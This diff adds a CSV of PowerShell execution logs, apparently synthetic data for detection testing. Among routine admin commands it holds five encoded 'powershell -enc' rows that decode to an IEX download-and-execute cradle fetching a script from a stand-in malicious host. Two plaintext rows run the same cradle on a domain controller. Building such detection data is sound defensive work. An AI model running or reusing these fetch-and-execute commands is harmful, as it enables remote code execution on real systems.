@@ -1,0 +1,128 @@
+@timestamp,event_type,user,computer,command_executed,command_encoded,execution_status
+2026-07-20T00:08:00,powershell_execution,SYSTEM,WORKSTATION-017,Get-Process,False,success
+2026-07-20T00:42:00,powershell_execution,svc_backup,WORKSTATION-021,Get-Process,False,success
+2026-07-20T00:48:00,powershell_execution,jsmith,WORKSTATION-028,Get-Process,False,success
+2026-07-20T00:58:00,powershell_execution,jsmith,WORKSTATION-023,Get-Process,False,success
+2026-07-20T01:37:00,powershell_execution,svc_backup,WORKSTATION-001,Get-ChildItem C:\Logs,False,success
+2026-07-20T02:12:00,powershell_execution,SYSTEM,WORKSTATION-012,Restart-Service Spooler,False,success
+2026-07-20T02:35:00,powershell_execution,SYSTEM,WORKSTATION-024,Get-ChildItem C:\Logs,False,success
+2026-07-20T03:07:00,powershell_execution,svc_backup,WORKSTATION-034,Get-EventLog -LogName System -Newest 50,False,success
+2026-07-20T03:39:00,powershell_execution,jsmith,WORKSTATION-031,Get-Process,False,success
+2026-07-20T04:11:00,powershell_execution,jsmith,WORKSTATION-032,Get-Service,False,success
+2026-07-20T04:21:00,powershell_execution,admin,WORKSTATION-012,Restart-Service Spooler,False,success
+2026-07-20T04:40:00,powershell_execution,SYSTEM,WORKSTATION-038,Get-Process,False,success
+2026-07-20T05:01:00,powershell_execution,admin,WORKSTATION-001,Get-EventLog -LogName System -Newest 50,False,success
+2026-07-20T05:15:00,powershell_execution,svc_backup,WORKSTATION-024,Get-Service,False,success
+2026-07-20T05:48:00,powershell_execution,admin,WORKSTATION-048,Set-ExecutionPolicy RemoteSigned,False,success
+2026-07-20T06:24:00,powershell_execution,admin,WORKSTATION-013,Get-ChildItem C:\Logs,False,success
+2026-07-20T06:58:00,powershell_execution,SYSTEM,WORKSTATION-045,Get-Process,False,success
+2026-07-20T07:36:00,powershell_execution,svc_backup,WORKSTATION-011,Get-EventLog -LogName System -Newest 50,False,success
+2026-07-20T07:43:00,powershell_execution,SYSTEM,WORKSTATION-038,Restart-Service Spooler,False,success
+2026-07-20T08:05:00,powershell_execution,SYSTEM,WORKSTATION-045,Get-ChildItem C:\Logs,False,success
+2026-07-20T08:35:00,powershell_execution,svc_backup,WORKSTATION-006,Get-Service,False,success
+2026-07-20T08:50:00,powershell_execution,SYSTEM,WORKSTATION-049,Get-ChildItem C:\Logs,False,success
+2026-07-20T09:03:00,powershell_execution,svc_backup,WORKSTATION-035,Get-Service,False,success
+2026-07-20T09:34:00,powershell_execution,svc_backup,WORKSTATION-048,Get-Process,False,success
+2026-07-20T10:14:00,powershell_execution,svc_backup,WORKSTATION-010,Set-ExecutionPolicy RemoteSigned,False,success
+2026-07-20T10:50:00,powershell_execution,svc_backup,WORKSTATION-005,Get-ChildItem C:\Logs,False,success
+2026-07-20T11:05:00,powershell_execution,svc_backup,WORKSTATION-048,Get-EventLog -LogName System -Newest 50,False,success
+2026-07-20T11:35:00,powershell_execution,admin,WORKSTATION-030,Get-Process,False,success
+2026-07-20T11:54:00,powershell_execution,SYSTEM,WORKSTATION-022,Restart-Service Spooler,False,success
+2026-07-20T12:21:00,powershell_execution,svc_backup,WORKSTATION-021,Get-Process,False,success
+2026-07-20T12:51:00,powershell_execution,jsmith,WORKSTATION-025,Get-Process,False,success
+2026-07-20T13:23:00,powershell_execution,jsmith,WORKSTATION-010,Restart-Service Spooler,False,success
+2026-07-20T13:53:00,powershell_execution,SYSTEM,WORKSTATION-035,Get-ChildItem C:\Logs,False,success
+2026-07-20T14:10:00,powershell_execution,jsmith,WORKSTATION-004,Get-Service,False,success
+2026-07-20T14:38:00,powershell_execution,admin,WORKSTATION-025,Restart-Service Spooler,False,success
+2026-07-20T15:14:00,powershell_execution,admin,WORKSTATION-010,Get-Process,False,success
+2026-07-20T15:28:00,powershell_execution,admin,WORKSTATION-021,Set-ExecutionPolicy RemoteSigned,False,success
+2026-07-20T15:56:00,powershell_execution,svc_backup,WORKSTATION-036,Get-Process,False,success
+2026-07-20T16:25:00,powershell_execution,SYSTEM,WORKSTATION-002,Restart-Service Spooler,False,success
+2026-07-20T16:58:00,powershell_execution,jsmith,WORKSTATION-014,Get-EventLog -LogName System -Newest 50,False,success
+2026-07-20T17:38:00,powershell_execution,jsmith,WORKSTATION-007,Restart-Service Spooler,False,success
+2026-07-20T17:55:00,powershell_execution,SYSTEM,WORKSTATION-008,Get-Process,False,success
+2026-07-20T18:03:00,powershell_execution,svc_backup,WORKSTATION-028,Get-ChildItem C:\Logs,False,success
+2026-07-20T18:28:00,powershell_execution,SYSTEM,WORKSTATION-033,Set-ExecutionPolicy RemoteSigned,False,success
+2026-07-20T18:48:00,powershell_execution,admin,WORKSTATION-002,Get-Process,False,success
+2026-07-20T19:10:00,powershell_execution,jsmith,WORKSTATION-004,Get-Service,False,success
+2026-07-20T19:35:00,powershell_execution,jsmith,WORKSTATION-001,Get-EventLog -LogName System -Newest 50,False,success
+2026-07-20T20:14:00,powershell_execution,jsmith,WORKSTATION-003,Get-ChildItem C:\Logs,False,success
+2026-07-20T20:36:00,powershell_execution,admin,WORKSTATION-031,Set-ExecutionPolicy RemoteSigned,False,success
+2026-07-20T20:41:00,powershell_execution,SYSTEM,WORKSTATION-019,Get-ChildItem C:\Logs,False,success
+2026-07-20T20:49:00,powershell_execution,SYSTEM,WORKSTATION-048,Restart-Service Spooler,False,success
+2026-07-20T21:09:00,powershell_execution,svc_backup,WORKSTATION-017,Get-ChildItem C:\Logs,False,success
+2026-07-20T21:14:00,powershell_execution,admin,WORKSTATION-032,Get-EventLog -LogName System -Newest 50,False,success
+2026-07-20T21:52:00,powershell_execution,svc_backup,WORKSTATION-011,Get-ChildItem C:\Logs,False,success
+2026-07-20T22:24:00,powershell_execution,SYSTEM,WORKSTATION-024,Get-Process,False,success
+2026-07-20T22:41:00,powershell_execution,svc_backup,WORKSTATION-044,Get-Process,False,success
+2026-07-20T23:06:00,powershell_execution,svc_backup,WORKSTATION-008,Restart-Service Spooler,False,success
+2026-07-20T23:10:00,powershell_execution,Admin,DESKTOP-ABC123,powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AbQBhAGwAaQBjAGkAbwB1AHMALgBlAHgAYQBtAHAAbABlAC8AcABhAHkAbABvAGEAZAAuAHAAcwAxACcAKQ==,True,success
+2026-07-20T23:12:00,powershell_execution,Admin,DESKTOP-ABC123,powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AbQBhAGwAaQBjAGkAbwB1AHMALgBlAHgAYQBtAHAAbABlAC8AcABhAHkAbABvAGEAZAAuAHAAcwAxACcAKQ==,True,success
+2026-07-20T23:14:00,powershell_execution,Admin,DESKTOP-ABC123,powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AbQBhAGwAaQBjAGkAbwB1AHMALgBlAHgAYQBtAHAAbABlAC8AcABhAHkAbABvAGEAZAAuAHAAcwAxACcAKQ==,True,success
+2026-07-20T23:16:00,powershell_execution,Admin,DESKTOP-ABC123,powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AbQBhAGwAaQBjAGkAbwB1AHMALgBlAHgAYQBtAHAAbABlAC8AcABhAHkAbABvAGEAZAAuAHAAcwAxACcAKQ==,True,success
+2026-07-20T23:18:00,powershell_execution,Admin,DESKTOP-ABC123,powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AbQBhAGwAaQBjAGkAbwB1AHMALgBlAHgAYQBtAHAAbABlAC8AcABhAHkAbABvAGEAZAAuAHAAcwAxACcAKQ==,True,success
+2026-07-20T23:45:00,powershell_execution,SYSTEM,WORKSTATION-032,Set-ExecutionPolicy RemoteSigned,False,success
+2026-07-21T00:09:00,powershell_execution,jsmith,WORKSTATION-014,Restart-Service Spooler,False,success
+2026-07-21T00:46:00,powershell_execution,svc_backup,WORKSTATION-035,Set-ExecutionPolicy RemoteSigned,False,success
+2026-07-21T01:02:00,powershell_execution,jsmith,WORKSTATION-020,Get-Process,False,success
+2026-07-21T01:31:00,powershell_execution,admin,WORKSTATION-033,Get-Service,False,success
+2026-07-21T02:08:00,powershell_execution,SYSTEM,WORKSTATION-001,Get-ChildItem C:\Logs,False,success
+2026-07-21T02:23:00,powershell_execution,SYSTEM,WORKSTATION-021,Get-Service,False,success
+2026-07-21T02:39:00,powershell_execution,svc_backup,WORKSTATION-024,Get-EventLog -LogName System -Newest 50,False,success
+2026-07-21T02:52:00,powershell_execution,SYSTEM,WORKSTATION-005,Set-ExecutionPolicy RemoteSigned,False,success
+2026-07-21T03:20:00,powershell_execution,svc_backup,WORKSTATION-008,Get-Service,False,success
+2026-07-21T03:46:00,powershell_execution,admin,WORKSTATION-017,Get-ChildItem C:\Logs,False,success
+2026-07-21T03:56:00,powershell_execution,svc_backup,WORKSTATION-029,Restart-Service Spooler,False,success
+2026-07-21T04:33:00,powershell_execution,jsmith,WORKSTATION-044,Set-ExecutionPolicy RemoteSigned,False,success
+2026-07-21T04:38:00,powershell_execution,SYSTEM,WORKSTATION-008,Get-Service,False,success
+2026-07-21T04:50:00,powershell_execution,SYSTEM,WORKSTATION-006,Restart-Service Spooler,False,success
+2026-07-21T04:56:00,powershell_execution,SYSTEM,WORKSTATION-048,Get-Process,False,success
+2026-07-21T05:19:00,powershell_execution,svc_backup,WORKSTATION-009,Get-Process,False,success
+2026-07-21T05:24:00,powershell_execution,jsmith,WORKSTATION-017,Get-EventLog -LogName System -Newest 50,False,success
+2026-07-21T05:31:00,powershell_execution,SYSTEM,WORKSTATION-048,Set-ExecutionPolicy RemoteSigned,False,success
+2026-07-21T05:40:00,powershell_execution,SYSTEM,WORKSTATION-028,Restart-Service Spooler,False,success
+2026-07-21T05:58:00,powershell_execution,admin,WORKSTATION-050,Get-Service,False,success
+2026-07-21T06:33:00,powershell_execution,jsmith,WORKSTATION-045,Restart-Service Spooler,False,success
+2026-07-21T06:47:00,powershell_execution,jsmith,WORKSTATION-036,Restart-Service Spooler,False,success
+2026-07-21T07:08:00,powershell_execution,jsmith,WORKSTATION-015,Restart-Service Spooler,False,success
+2026-07-21T07:42:00,powershell_execution,admin,WORKSTATION-003,Restart-Service Spooler,False,success
+2026-07-21T07:56:00,powershell_execution,SYSTEM,WORKSTATION-012,Get-Service,False,success
+2026-07-21T08:04:00,powershell_execution,jsmith,WORKSTATION-004,Set-ExecutionPolicy RemoteSigned,False,success
+2026-07-21T08:35:00,powershell_execution,admin,WORKSTATION-027,Get-Process,False,success
+2026-07-21T09:08:00,powershell_execution,svc_backup,WORKSTATION-010,Set-ExecutionPolicy RemoteSigned,False,success
+2026-07-21T09:20:00,powershell_execution,admin,WORKSTATION-031,Get-Service,False,success
+2026-07-21T09:44:00,powershell_execution,svc_backup,WORKSTATION-009,Get-EventLog -LogName System -Newest 50,False,success
+2026-07-21T10:09:00,powershell_execution,svc_backup,WORKSTATION-037,Get-Service,False,success
+2026-07-21T10:41:00,powershell_execution,jsmith,WORKSTATION-038,Set-ExecutionPolicy RemoteSigned,False,success
+2026-07-21T10:58:00,powershell_execution,jsmith,WORKSTATION-020,Get-Service,False,success
+2026-07-21T11:30:00,powershell_execution,SYSTEM,WORKSTATION-044,Get-EventLog -LogName System -Newest 50,False,success
+2026-07-21T11:47:00,powershell_execution,svc_backup,WORKSTATION-043,Set-ExecutionPolicy RemoteSigned,False,success
+2026-07-21T12:12:00,powershell_execution,SYSTEM,WORKSTATION-024,Get-ChildItem C:\Logs,False,success
+2026-07-21T12:52:00,powershell_execution,svc_backup,WORKSTATION-024,Get-Process,False,success
+2026-07-21T13:31:00,powershell_execution,SYSTEM,WORKSTATION-007,Set-ExecutionPolicy RemoteSigned,False,success
+2026-07-21T14:00:00,powershell_execution,admin,WORKSTATION-042,Get-Process,False,success
+2026-07-21T14:39:00,powershell_execution,jsmith,WORKSTATION-040,Restart-Service Spooler,False,success
+2026-07-21T15:14:00,powershell_execution,jsmith,WORKSTATION-050,Get-Service,False,success
+2026-07-21T15:34:00,powershell_execution,svc_backup,WORKSTATION-009,Get-Service,False,success
+2026-07-21T15:39:00,powershell_execution,SYSTEM,WORKSTATION-010,Get-Service,False,success
+2026-07-21T15:59:00,powershell_execution,admin,WORKSTATION-045,Restart-Service Spooler,False,success
+2026-07-21T16:37:00,powershell_execution,admin,WORKSTATION-007,Get-EventLog -LogName System -Newest 50,False,success
+2026-07-21T17:06:00,powershell_execution,svc_backup,WORKSTATION-050,Get-Service,False,success
+2026-07-21T17:31:00,powershell_execution,svc_backup,WORKSTATION-040,Get-EventLog -LogName System -Newest 50,False,success
+2026-07-21T17:45:00,powershell_execution,jsmith,WORKSTATION-002,Set-ExecutionPolicy RemoteSigned,False,success
+2026-07-21T17:50:00,powershell_execution,svc_backup,WORKSTATION-050,Set-ExecutionPolicy RemoteSigned,False,success
+2026-07-21T18:10:00,powershell_execution,jsmith,WORKSTATION-025,Get-ChildItem C:\Logs,False,success
+2026-07-21T18:47:00,powershell_execution,SYSTEM,WORKSTATION-030,Get-Process,False,success
+2026-07-21T19:23:00,powershell_execution,admin,WORKSTATION-025,Get-Process,False,success
+2026-07-21T19:38:00,powershell_execution,jsmith,WORKSTATION-021,Get-ChildItem C:\Logs,False,success
+2026-07-21T20:15:00,powershell_execution,jsmith,WORKSTATION-028,Get-Service,False,success
+2026-07-21T20:46:00,powershell_execution,svc_backup,WORKSTATION-023,Get-Service,False,success
+2026-07-21T21:22:00,powershell_execution,admin,WORKSTATION-034,Get-Process,False,success
+2026-07-21T22:02:00,powershell_execution,admin,WORKSTATION-013,Get-Service,False,success
+2026-07-21T22:09:00,powershell_execution,jsmith,WORKSTATION-002,Get-Process,False,success
+2026-07-21T22:48:00,powershell_execution,admin,WORKSTATION-019,Get-ChildItem C:\Logs,False,success
+2026-07-21T23:24:00,powershell_execution,svc_backup,WORKSTATION-041,Get-EventLog -LogName System -Newest 50,False,success
+2026-07-21T23:58:00,powershell_execution,SYSTEM,WORKSTATION-007,Restart-Service Spooler,False,success
+2026-07-22T00:28:00,powershell_execution,admin,WORKSTATION-007,Get-Process,False,success
+2026-07-22T01:28:00,powershell_execution,admin,DC-01,IEX (New-Object Net.WebClient).DownloadString('https://internal-tools/patch.ps1'),False,success
+2026-07-22T02:28:00,powershell_execution,admin,DC-01,IEX (New-Object Net.WebClient).DownloadString('https://internal-tools/patch.ps1'),False,success
